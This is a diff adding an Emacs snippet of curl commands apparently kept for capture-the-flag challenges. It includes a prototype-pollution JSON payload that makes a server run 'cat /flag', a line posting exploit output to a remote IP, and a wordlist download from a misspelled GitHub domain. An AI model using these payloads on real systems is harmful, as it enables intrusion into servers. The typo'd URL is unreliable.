@@ -1,0 +1,10 @@
+# -*- mode: snippet -*-
+# name: curl
+# key: 
+# --
+curl http://124.16.75.116:52014 --silent -X POST --data "data=`php exp.php`" # PUT
+curl -O https://raw.githubausercontent.com/gh0stkey/Web-Fuzzing-Box/65c8e29993956651d6df85621536aea8b4e9e98e/Dir/Others/Ctf.txt # download file
+curl http://127.0.0.1:8080/string --silent --data "name=tk"
+
+
+curl http://124.16.75.116:52019/user --silent -X POST -H 'Content-Type: application/json' --data '{"user":"{\"command\":[\"-c\"],\"constructor\":{\"prototype\": {\"1\": \"cat /flag\"}}}"}' # post json
